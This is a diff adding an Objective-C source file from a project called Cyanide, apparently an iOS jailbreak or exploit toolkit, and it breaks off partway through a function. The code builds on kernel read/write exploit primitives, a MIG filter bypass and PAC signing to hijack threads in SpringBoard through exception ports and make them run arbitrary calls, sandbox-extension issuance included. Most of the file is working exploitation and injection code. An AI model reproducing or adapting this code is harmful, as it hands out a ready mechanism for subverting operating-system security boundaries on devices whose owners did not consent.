@@ -1,0 +1,2995 @@
+//
+//  remote_call.m
+//  Cyanide
+//
+//  Created by seo on 3/29/26.
+//
+
+#import <Foundation/Foundation.h>
+#import <mach/mach.h>
+#import <mach/mach_time.h>
+#import <UIKit/UIKit.h>
+#import <dlfcn.h>
+#import <pthread.h>
+#import <errno.h>
+#import <sys/socket.h>
+#import <sys/un.h>
+#import <unistd.h>
+#import <stdint.h>
+#import <stdlib.h>
+#import <string.h>
+
+#import "RemoteCall.h"
+#import "VPhoneDebug.h"
+#import "VM.h"
+#import "Exception.h"
+#import "PAC.h"
+#import "Thread.h"
+#import "MigFilterBypassThread.h"
+#import "../../kexploit/kexploit_opa334.h"
+#import "../../kexploit/krw.h"
+#import "../../kexploit/offsets.h"
+#import "../../kexploit/kutils.h"
+#import "../../kexploit/xpaci.h"
+#import "../../utils/process.h"
+
+extern bool gIsPACSupported;
+extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
+
+// xnu-10002.81.5/osfmk/kern/exc_guard.h
+#define EXC_GUARD_ENCODE_TYPE(code, type) \
+    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
+#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
+    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
+#define EXC_GUARD_ENCODE_TARGET(code, target) \
+    ((code) |= (((uint64_t)(target) & 0xffffffffull)))
+
+
+// xnu-10002.81.5/osfmk/mach/arm/_structs.h
+#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
+#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8
+
+// from pe_main.js
+#define SHMEM_CACHE_SIZE                256
+#define FAKE_PC_TROJAN_CREATOR          0x101
+#define FAKE_LR_TROJAN_CREATOR          0x201
+#define FAKE_PC_TROJAN                  0x301
+#define FAKE_LR_TROJAN                  0x401
+
+// Same monotonic microsecond clock as now_us() in SpringBoardOverlay.m, kept
+// separate so RemoteCall.m does not have to know about the overlay.
+static uint64_t rc_now_us(void) {
+    static mach_timebase_info_data_t tb;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ mach_timebase_info(&tb); });
+    return (mach_absolute_time() * tb.numer / tb.denom) / 1000ULL;
+}
+
+// Per-call cost breakdown. Pure instrumentation: it reads three timestamps the
+// caller already had and adds them up. No branch here can change what a remote
+// call does, and nothing here can change how many remote calls are made.
+//
+// [SB-PUSH] measured the whole publish at 52-78ms with 7-11 calls in it, which
+// is 5.8ms per call against a 16.7ms budget for 60Hz. That number says the cost
+// is in the transport, not in the subpath count, but it does not say WHICH part
+// of the transport. Until this line exists the candidates are a guess, and the
+// previous two guesses (a stale "expect 0x301" string, and r_settle on a path
+// that does not use it) were both wrong.
+//
+// w1   wait_exception for the park
+// pac  sign_state, which calls remote_pac twice (pc and lr)
+// w2   wait_exception for the result
+// rest everything else in the call, reply_with_state included
+static uint64_t s_ccW1US, s_ccSignUS, s_ccW2US, s_ccRestUS, s_ccN, s_ccAtUS;
+
+static void rc_note_call_cost(uint64_t tStart, uint64_t tW1, uint64_t tSign) {
+    const uint64_t now = rc_now_us();
+    s_ccW1US   += (tW1   - tStart);
+    s_ccSignUS += (tSign - tW1);
+    s_ccW2US   += (now   - tSign);
+    s_ccN++;
+    if (now - s_ccAtUS < 1000000ULL) return;
+    const uint64_t win = now - s_ccAtUS;
+    const uint64_t total = s_ccW1US + s_ccSignUS + s_ccW2US;
+    s_ccRestUS = (s_ccN && total / s_ccN < win / s_ccN)
+        ? (win - total) : 0;   // wall time in the call minus the parts we timed
+    s_ccAtUS = now;
+    NSLog(@"[SB-CALL] n=%llu per=%lluus w1=%lluus pac=%lluus w2=%lluus rest=%lluus win=%llums",
+          (unsigned long long)s_ccN,
+          (unsigned long long)(s_ccN ? win / s_ccN : 0),
+          (unsigned long long)(s_ccN ? s_ccW1US / s_ccN : 0),
+          (unsigned long long)(s_ccN ? s_ccSignUS / s_ccN : 0),
+          (unsigned long long)(s_ccN ? s_ccW2US / s_ccN : 0),
+          (unsigned long long)(s_ccN ? s_ccRestUS / s_ccN : 0),
+          (unsigned long long)(win / 1000ULL));
+    s_ccW1US = s_ccSignUS = s_ccW2US = s_ccRestUS = s_ccN = 0;
+}
+
+// xnu-10002.81.5/osfmk/kern/thread.h — also defined in Thread.m
+#define TH_IN_MACH_EXCEPTION            0x8000
+
+// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
+#define BREAKPOINT_ENABLE 481
+#define BREAKPOINT_DISABLE 0
+
+uint64_t g_RC_targetProcOverride = 0;
+uint64_t g_RC_gadgetPacia = 0;
+
+static pthread_mutex_t g_universal_ipc_mutex;
+static pthread_once_t g_universal_ipc_mutex_once = PTHREAD_ONCE_INIT;
+
+static void init_universal_mutex(void)
+{
+    pthread_mutexattr_t attr;
+    pthread_mutexattr_init(&attr);
+    pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
+    pthread_mutex_init(&g_universal_ipc_mutex, &attr);
+    pthread_mutexattr_destroy(&attr);
+}
+
+uint64_t do_remote_call_temp_internal(int timeout, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
+uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
+    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
+bool remote_read_internal(uint64_t src, void *dst, uint64_t size);
+bool remote_write_internal(uint64_t dst, const void *src, uint64_t size);
+int destroy_remote_call_internal(void);
+void abandon_remote_call_internal(void);
+
+static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
+static __thread uint32_t g_RC_lastInitFailurePid = 0;
+
+typedef struct RemoteCallState {
+    uint64_t taskAddr;
+    bool creatingExtraThread;
+    mach_port_t firstExceptionPort;
+    mach_port_t secondExceptionPort;
+    uint64_t firstExceptionPortAddr;
+    uint64_t secondExceptionPortAddr;
+    pthread_t dummyThread;
+    mach_port_t dummyThreadMach;
+    uint64_t dummyThreadAddr;
+    uint64_t dummyThreadTro;
+    uint64_t selfThreadAddr;
+    uint32_t selfThreadCtid;
+    arm_thread_state64_internal originalState;
+    uint64_t vmMap;
+    uint64_t callThreadAddr;
+    uint64_t trojanThreadAddr;
+    int pid;
+    bool success;
+    NSMutableArray<NSNumber *> *threadList;
+    uint64_t trojanMem;
+    struct VMShmem shmemCache[SHMEM_CACHE_SIZE];
+    uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
+    uint64_t shmemClock;
+    uint64_t shmemEvictions;
+    int firstExceptionTimeoutMS;
+    int stableExceptionTimeoutFloorMS;
+    bool originalThreadOnly;
+    bool vphoneBridge;
+    // Two latches about a thread that is running inside SpringBoard right now.
+    //
+    // crossingPoisoned: a crossing timed out waiting for that thread's sentinel
+    // fault and the fault was never reaped, so the port queue no longer matches
+    // the crossings. Hijacking the thread in that state resumes it with a state
+    // belonging to a different call, and the address it then executes is one
+    // nobody chose.
+    //
+    // wedgeKeepPorts: restore_trojan_thread failed, so the thread is still alive in
+    // SpringBoard, still sitting on one of our sentinels, and the two exception
+    // ports are the only thing that can catch it waking up. Destroying a receive
+    // right is enough to cause that even though the kernel keeps the port object
+    // alive, because SpringBoard holds a reference to it: with no receive right
+    // left the exception has nowhere to go, the kernel treats it as unhandled, and
+    // SpringBoard takes a SIGBUS. That is the crash this was written for.
+    bool crossingPoisoned;
+    bool wedgeKeepPorts;
+} RemoteCallState;
+
+static RemoteCallState g_RC_defaultState = { .success = true, .stableExceptionTimeoutFloorMS = 10000 };
+static __thread RemoteCallState *g_RC_currentState;
+
+@interface RemoteCallSession ()
+- (RemoteCallState *)remoteCallStatePointer;
+@end
+
+static RemoteCallState *remote_call_current_state(void)
+{
+    if (!g_RC_currentState)
+        g_RC_currentState = &g_RC_defaultState;
+    return g_RC_currentState;
+}
+
+static RemoteCallState *remote_call_push_state(RemoteCallState *state)
+{
+    RemoteCallState *previous = remote_call_current_state();
+    g_RC_currentState = state ?: &g_RC_defaultState;
+    return previous;
+}
+
+static void remote_call_pop_state(RemoteCallState *previous)
+{
+    g_RC_currentState = previous ?: &g_RC_defaultState;
+}
+
+#define g_RC_taskAddr              (remote_call_current_state()->taskAddr)
+#define g_RC_creatingExtraThread   (remote_call_current_state()->creatingExtraThread)
+#define g_RC_firstExceptionPort    (remote_call_current_state()->firstExceptionPort)
+#define g_RC_secondExceptionPort   (remote_call_current_state()->secondExceptionPort)
+#define g_RC_firstExceptionPortAddr  (remote_call_current_state()->firstExceptionPortAddr)
+#define g_RC_secondExceptionPortAddr (remote_call_current_state()->secondExceptionPortAddr)
+#define g_RC_dummyThread           (remote_call_current_state()->dummyThread)
+#define g_RC_dummyThreadMach       (remote_call_current_state()->dummyThreadMach)
+#define g_RC_dummyThreadAddr       (remote_call_current_state()->dummyThreadAddr)
+#define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
+#define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
+#define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)
+#define g_RC_originalState         (remote_call_current_state()->originalState)
+#define g_RC_vmMap                 (remote_call_current_state()->vmMap)
+#define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
+#define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
+#define g_RC_pid                   (remote_call_current_state()->pid)
+#define g_RC_success               (remote_call_current_state()->success)
+#define g_RC_threadList            (remote_call_current_state()->threadList)
+#define g_RC_trojanMem             (remote_call_current_state()->trojanMem)
+#define g_RC_shmemCache            (remote_call_current_state()->shmemCache)
+#define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
+#define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
+#define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
+#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
+#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
+#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
+#define g_RC_vphoneBridge            (remote_call_current_state()->vphoneBridge)
+#define g_RC_crossingPoisoned        (remote_call_current_state()->crossingPoisoned)
+#define g_RC_wedgeKeepPorts          (remote_call_current_state()->wedgeKeepPorts)
+
+static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
+{
+    g_RC_lastInitFailure = failure;
+    g_RC_lastInitFailurePid = pid;
+}
+
+RemoteCallInitFailure remote_call_last_init_failure(void)
+{
+    return g_RC_lastInitFailure;
+}
+
+uint32_t remote_call_last_init_failure_pid(void)
+{
+    return g_RC_lastInitFailurePid;
+}
+
+const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
+{
+    switch (failure) {
+        case RemoteCallInitFailureNone: return "none";
+        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
+        case RemoteCallInitFailureProcessMissing: return "process not found";
+        case RemoteCallInitFailureInvalidTask: return "invalid task";
+        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
+        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
+        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
+        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
+        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
+        case RemoteCallInitFailureBootstrapGetpid: return "bootstrap getpid failed (0x101 miss / 0x201?)";
+        case RemoteCallInitFailurePthreadCreate: return "pthread_create_suspended_np / mach_thread failed";
+        case RemoteCallInitFailureCallThread: return "synthetic call thread kobject invalid";
+        case RemoteCallInitFailureThreadResume: return "thread_resume synthetic failed";
+        case RemoteCallInitFailureRestoreOriginal: return "restore original after pthread failed";
+        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
+    }
+    return "unknown RemoteCall init failure";
+}
+
+static bool remote_call_verbose_logging(void)
+{
+    const char *env = getenv("RC_VERBOSE");
+    return env && env[0] && strcmp(env, "0") != 0;
+}
+
+#define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)
+// 3uTools Realtime Log catches NSLog; plain printf is often invisible there.
+#define RC_DIAG(fmt, ...) do { \
+        char _rc_diag_buf[1024]; \
+        snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
+        NSLog(@"%s", _rc_diag_buf); \
+    } while (0)
+
+static bool remote_call_should_log_result(const char *name, bool stable)
+{
+    if (remote_call_verbose_logging())
+        return true;
+
+    if (!name)
+        return true;
+
+    static const char *quietSymbols[] = {
+        // The overlay draws with these and nothing else, 7 to 11 times per
+        // publish. They were missing here, so every single drawing call printed
+        // its return value to stderr, and stderr is unbuffered when it is a
+        // pipe, so that is a write syscall per call on the frame path.
+        "CGPathCreateMutable",
+        "CGPathAddRects",
+        "CGPathAddLines",
+        "CGPathRelease",
+        "malloc",
+        "free",
+        "objc_msgSend",
+        "objc_msgSendSuper",
+        "objc_msgSendSuper2",
+        "sel_registerName",
+        "sel_getUid",
+        "objc_getClass",
+        "objc_lookUpClass",
+        "objc_allocateClassPair",
+        "object_getClass",
+        "object_getClassName",
+        "class_getName",
+        "class_getSuperclass",
+        "class_getInstanceMethod",
+        "class_getClassMethod",
+        "class_getInstanceVariable",
+        "class_getInstanceSize",
+        "class_respondsToSelector",
+        "method_getTypeEncoding",
+        "method_getName",
+        "method_getImplementation",
+        "ivar_getOffset",
+        "ivar_getName",
+        "ivar_getTypeEncoding",
+        "strdup",
+        "strcmp",
+        "strlen",
+        "memcpy",
+        "memcmp",
+        "CFStringCreateWithCString",
+        "CFStringCreateWithCStringNoCopy",
+        "CFStringGetCStringPtr",
+        "CFStringGetLength",
+        "CFNumberGetValue",
+        "CFRelease",
+        "CFRetain",
+        "dlopen",
+        "dlsym",
+        "dladdr",
+        "IOServiceMatching",
+        "IOServiceGetMatchingService",
+        "IORegistryEntryCreateCFProperty",
+        "IOObjectRelease",
+        "memset",
+        "getpid",
+        "pthread_create_suspended_np",
+        "pthread_mach_thread_np",
+        "thread_resume",
+        "mmap",
+        "sandbox_extension_issue_file",
+        "sandbox_extension_issue_file_to_process",
+        "sandbox_extension_consume",
+    };
+
+    for (size_t i = 0; i < sizeof(quietSymbols) / sizeof(quietSymbols[0]); i++) {
+        if (strcmp(name, quietSymbols[i]) == 0)
+            return false;
+    }
+
+    // Log-once symbols: emit the first invocation so it's visible in the log,
+    // then go silent so per-window / per-iteration loops don't flood. CAS
+    // means concurrent first-callers never both win.
+    static struct { const char *name; volatile int logged; } logOnceTable[] = {
+        { "objc_setAssociatedObject", 0 },
+        { "objc_getAssociatedObject", 0 },
+    };
+    for (size_t i = 0; i < sizeof(logOnceTable) / sizeof(logOnceTable[0]); i++) {
+        if (strcmp(name, logOnceTable[i].name) == 0) {
+            return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
+        }
+    }
+
+    if (!stable)
+        return true;
+
+    return true;
+}
+
+#define CY_VPHONE_BRIDGE_MAGIC 0x43595342u
+#define CY_VPHONE_BRIDGE_SOCK "/private/var/mobile/Library/Caches/com.zeroxjf.cyanide.vphone-springboard.sock"
+
+typedef struct __attribute__((packed)) {
+    uint32_t magic;
+    uint32_t op;
+    uint64_t addr;
+    uint64_t size;
+    uint64_t args[8];
+    char name[128];
+} CYVPhoneBridgeRequest;
+
+typedef struct __attribute__((packed)) {
+    uint32_t magic;
+    uint32_t status;
+    uint64_t result;
+    uint64_t extra;
+} CYVPhoneBridgeResponse;
+
+static bool rc_read_full_fd(int fd, void *buf, size_t len)
+{
+    uint8_t *p = (uint8_t *)buf;
+    while (len > 0) {
+        ssize_t n = read(fd, p, len);
+        if (n == 0) return false;
+        if (n < 0) {
+            if (errno == EINTR) continue;
+            return false;
+        }
+        p += (size_t)n;
+        len -= (size_t)n;
+    }
+    return true;
+}
+
+static bool rc_write_full_fd(int fd, const void *buf, size_t len)
+{
+    const uint8_t *p = (const uint8_t *)buf;
+    while (len > 0) {
+        ssize_t n = write(fd, p, len);
+        if (n < 0) {
+            if (errno == EINTR) continue;
+            return false;
+        }
+        if (n == 0) return false;
+        p += (size_t)n;
+        len -= (size_t)n;
+    }
+    return true;
+}
+
+static int rc_vphone_bridge_connect(void)
+{
+    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (fd < 0) return -1;
+
+    struct sockaddr_un sun;
+    memset(&sun, 0, sizeof(sun));
+    sun.sun_family = AF_UNIX;
+    strlcpy(sun.sun_path, CY_VPHONE_BRIDGE_SOCK, sizeof(sun.sun_path));
+    if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
+        close(fd);
+        return -1;
+    }
+    return fd;
+}
+
+static bool rc_vphone_bridge_request(CYVPhoneBridgeRequest *req,
+                                     CYVPhoneBridgeResponse *resp,
+                                     const void *writeData,
+                                     void *readData)
+{
+    if (!req || !resp) return false;
+    req->magic = CY_VPHONE_BRIDGE_MAGIC;
+
+    int fd = rc_vphone_bridge_connect();
+    if (fd < 0) {
+        printf("[VPHONE-BRIDGE] connect failed errno=%d\n", errno);
+        return false;
+    }
+
+    bool ok = rc_write_full_fd(fd, req, sizeof(*req));
+    if (ok && writeData && req->op == 5 && req->size)
+        ok = rc_write_full_fd(fd, writeData, (size_t)req->size);
+    if (ok)
+        ok = rc_read_full_fd(fd, resp, sizeof(*resp));
+    if (ok && resp->magic != CY_VPHONE_BRIDGE_MAGIC)
+        ok = false;
+    if (ok && readData && req->op == 4 && resp->status == 0 && resp->extra)
+        ok = rc_read_full_fd(fd, readData, (size_t)resp->extra);
+
+    close(fd);
+    return ok;
+}
+
+static bool rc_vphone_bridge_ping(void)
+{
+    CYVPhoneBridgeRequest req = { .op = 1 };
+    CYVPhoneBridgeResponse resp = {0};
+    return rc_vphone_bridge_request(&req, &resp, NULL, NULL) &&
+           resp.status == 0 && resp.result == 1;
+}
+
+static uint64_t rc_vphone_bridge_call(uint32_t op, uint64_t pcAddr, const char *name,
+                                      uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
+                                      uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
+{
+    CYVPhoneBridgeRequest req = {0};
+    CYVPhoneBridgeResponse resp = {0};
+    req.op = op;
+    req.addr = pcAddr;
+    req.args[0] = x0; req.args[1] = x1; req.args[2] = x2; req.args[3] = x3;
+    req.args[4] = x4; req.args[5] = x5; req.args[6] = x6; req.args[7] = x7;
+    if (name && name[0])
+        strlcpy(req.name, name, sizeof(req.name));
+
+    if (!rc_vphone_bridge_request(&req, &resp, NULL, NULL) || resp.status != 0) {
+        printf("[VPHONE-BRIDGE] call failed op=%u name=%s addr=%#llx status=%u\n",
+               op, name ?: "(null)", pcAddr, resp.status);
+        g_RC_success = false;
+        return 0;
+    }
+    return resp.result;
+}
+
+static bool rc_vphone_bridge_unsafe_addr_call_name(const char *name)
+{
+    if (!name || !name[0]) return false;
+
+    static const char *blocked[] = {
+        "IOServiceMatching",
+        "IOServiceGetMatchingService",
+        "IORegistryEntryCreateCFProperty",
+        "IOObjectRelease",
+        "SBWorkspaceKillApplication",
+    };
+    for (size_t i = 0; i < sizeof(blocked) / sizeof(blocked[0]); i++) {
+        if (strcmp(name, blocked[i]) == 0) return true;
+    }
+    return false;
+}
+
+static bool rc_vphone_bridge_read(uint64_t src, void *dst, uint64_t size)
+{
+    if (!dst || size == 0) return true;
+    if (size > 0x100000) return false;
+    CYVPhoneBridgeRequest req = { .op = 4, .addr = src, .size = size };
+    CYVPhoneBridgeResponse resp = {0};
+    bool ok = rc_vphone_bridge_request(&req, &resp, NULL, dst) &&
+              resp.status == 0 && resp.extra == size;
+    if (!ok) g_RC_success = false;
+    return ok;
+}
+
+static bool rc_vphone_bridge_write(uint64_t dst, const void *src, uint64_t size)
+{
+    if (!src || size == 0) return true;
+    if (size > 0x100000) return false;
+    CYVPhoneBridgeRequest req = { .op = 5, .addr = dst, .size = size };
+    CYVPhoneBridgeResponse resp = {0};
+    bool ok = rc_vphone_bridge_request(&req, &resp, src, NULL) &&
+              resp.status == 0;
+    if (!ok) g_RC_success = false;
+    return ok;
+}
+
+static void release_shmem_slot(int i)
+{
+    if (i < 0 || i >= SHMEM_CACHE_SIZE) return;
+    if (g_RC_shmemCache[i].localAddress) {
+        mach_vm_deallocate(mach_task_self_,
+                           (mach_vm_address_t)g_RC_shmemCache[i].localAddress,
+                           PAGE_SIZE);
+    }
+    if (g_RC_shmemCache[i].port) {
+        mach_port_deallocate(mach_task_self_, (mach_port_name_t)g_RC_shmemCache[i].port);
+    }
+    memset(&g_RC_shmemCache[i], 0, sizeof(g_RC_shmemCache[i]));
+    g_RC_shmemUseCounter[i] = 0;
+}
+
+static void clear_remote_shmem_cache(void)
+{
+    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+        if (g_RC_shmemCache[i].used) release_shmem_slot(i);
+    }
+    g_RC_shmemClock = 0;
+    g_RC_shmemEvictions = 0;
+}
+
+// Exposed so remote_objc.m can drop a stale alias before injecting a string.
+// The cache is what lets remote_write land in a mapping that is no longer the
+// target's live page; r_alloc_str() in remote/remote_objc.m relies on this.
+void remote_clear_shmem_cache(void)
+{
+    clear_remote_shmem_cache();
+}
+
+static uint32_t reap_dead_port_names(const char *reason)
+{
+    mach_port_name_array_t names = NULL;
+    mach_port_type_array_t types = NULL;
+    mach_msg_type_number_t namesCount = 0;
+    mach_msg_type_number_t typesCount = 0;
+    kern_return_t kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount);
+    if (kr != KERN_SUCCESS) return 0;
+
+    mach_msg_type_number_t limit = namesCount < typesCount ? namesCount : typesCount;
+    uint32_t dead = 0;
+    for (mach_msg_type_number_t i = 0; i < limit; i++) {
+        if ((types[i] & MACH_PORT_TYPE_DEAD_NAME) == 0) continue;
+        if (mach_port_deallocate(mach_task_self_, names[i]) == KERN_SUCCESS) {
+            dead++;
+        }
+    }
+
+    if (dead && remote_call_verbose_logging()) {
+        static volatile uint64_t reapTotal = 0;
+        static volatile uint64_t reapEvents = 0;
+        uint64_t total = __sync_add_and_fetch(&reapTotal, dead);
+        uint64_t events = __sync_add_and_fetch(&reapEvents, 1);
+        printf("[RemoteCall] reaped %u ports current=%u cumulative=%llu events=%llu\n",
+               dead, namesCount, (unsigned long long)total, (unsigned long long)events);
+    }
+
+    if (names) {
+        vm_deallocate(mach_task_self_,
+                      (vm_address_t)names,
+                      (vm_size_t)namesCount * sizeof(mach_port_name_t));
+    }
+    if (types) {
+        vm_deallocate(mach_task_self_,
+                      (vm_address_t)types,
+                      (vm_size_t)typesCount * sizeof(mach_port_type_t));
+    }
+    return dead;
+}
+
+static void reap_dead_port_names_if_needed(const char *reason)
+{
+    static volatile uint32_t signCount = 0;
+    uint32_t count = __sync_add_and_fetch(&signCount, 1);
+    if ((count & 0x3f) != 0) return;
+    (void)reap_dead_port_names(reason);
+}
+
+bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+    bool success = false;
+
+    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
+    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
+    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
+        printf("[%s:%d] missing thread_set_exception_ports/pthread_exit symbols\n",
+               __FUNCTION__, __LINE__);
+        return false;
+    }
+    if (!is_kaddr_valid(currThread)) {
+        printf("[%s:%d] invalid target thread %#llx\n",
+               __FUNCTION__, __LINE__, currThread);
+        return false;
+    }
+    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
+        printf("[%s:%d] dummy thread unavailable mach=0x%x addr=%#llx\n",
+               __FUNCTION__, __LINE__, g_RC_dummyThreadMach, g_RC_dummyThreadAddr);
+        return false;
+    }
+
+    pthread_t pthread = NULL;
+    int createErr = pthread_create_suspended_np(&pthread, NULL,
+        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
+    if (createErr != 0 || !pthread) {
+        printf("[%s:%d] pthread_create_suspended_np failed err=%d thread=%p\n",
+               __FUNCTION__, __LINE__, createErr, pthread);
+        return false;
+    }
+
+    mach_port_t machThread = pthread_mach_thread_np(pthread);
+    if (!machThread) {
+        printf("[%s:%d] pthread_mach_thread_np returned null for helper thread\n",
+               __FUNCTION__, __LINE__);
+        pthread_cancel(pthread);
+        return false;
+    }
+    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
+    if (!is_kaddr_valid(machThreadAddr)) {
+        printf("[%s:%d] failed to resolve helper thread kobject mach=0x%x addr=%#llx\n",
+               __FUNCTION__, __LINE__, machThread, machThreadAddr);
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if(useMigFilterBypass) {
+        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
+    }
+
+    arm_thread_state64_internal state;
+    memset(&state, 0, sizeof(state));
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
+                                        (thread_state_t)&state, &count);
+    if (kr != KERN_SUCCESS) {
+        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
+               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    uint64_t diver = 0;
+    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
+
+    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
+    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
+
+    uint64_t exceptionMask = EXC_MASK_GUARD |
+                             EXC_MASK_BAD_ACCESS |
+                             EXC_MASK_BAD_INSTRUCTION |
+                             EXC_MASK_BREAKPOINT |
+                             EXC_MASK_ARITHMETIC;
+
+    state.__x[0] = g_RC_dummyThreadMach;
+    state.__x[1] = exceptionMask;
+    state.__x[2] = exceptionPort;
+    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
+    state.__x[4] = ARM_THREAD_STATE64;
+
+    if(useMigFilterBypass)
+        usleep(100000);
+
+    if (!thread_set_state_wrapper(machThread, machThreadAddr,
+                                  (arm_thread_state64_internal *)&state))
+    {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if(useMigFilterBypass)
+        usleep(100000);
+
+    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
+
+    if (!thread_resume_wrapper(machThread))
+    {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    for (int i = 0; i < 10; i++)
+    {
+        usleep(200000);
+
+        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
+        if (!is_kaddr_valid(kstack)) {
+            printf("[%s:%d] Failed to get valid kstack (%#llx). Retry...\n",
+                   __FUNCTION__, __LINE__, kstack);
+            continue;
+        }
+
+        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
+        if (!is_kaddr_valid(kernelSP)) {
+            printf("[%s:%d] Failed to get valid SP (%#llx). Retry...\n",
+                   __FUNCTION__, __LINE__, kernelSP);
+            continue;
+        }
+        usleep(100);
+
+        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
+        if (!is_kaddr_valid(pageBase)) {
+            printf("[%s:%d] invalid helper stack probe page %#llx\n",
+                   __FUNCTION__, __LINE__, pageBase);
+            continue;
+        }
+        char dataBuff[0x1000];
+        memset(dataBuff, 0, 0x1000);
+        kreadbuf(pageBase, &dataBuff, 0x1000);
+
+        uint64_t needleVal = g_RC_dummyThreadTro;
+        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
+        if (!match) {
+            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
+            continue;
+        }
+        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
+        uint64_t found = (uint64_t)foundOffset + 0x3000;
+        memset(dataBuff, 0, 0x1000);
+
+        bool correctTro = false;
+        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
+        uint64_t checkVal  = kread64(checkAddr);
+
+        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;   // on iPad 7(arm64)/18.3.2, offsets may be different
+        uint64_t checkVal2  = kread64(checkAddr2);
+
+        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
+            correctTro = true;
+        } else {
+            printf("[%s:%d] Wrong tro (%#llx/%#llx != %#llx). Retry...\n",
+                   __FUNCTION__, __LINE__, checkVal, checkVal2, exceptionMask);
+//            printf("[%s:%d] Wrong tro = 0x%llx (kread64 from 0x%llx, trunc_page(kernelSP) = 0x%llx), Retry...\n", __FUNCTION__, __LINE__, checkVal, checkAddr, trunc_page(kernelSP));
+//            khexdump(trunc_page(kernelSP), 0x4000);
+//            while(1) {};
+            continue;
+        }
+
+        if (found && correctTro) {
+            if (thread_get_task(currThread) == g_RC_taskAddr) {
+                uint64_t tro = thread_get_t_tro(currThread);
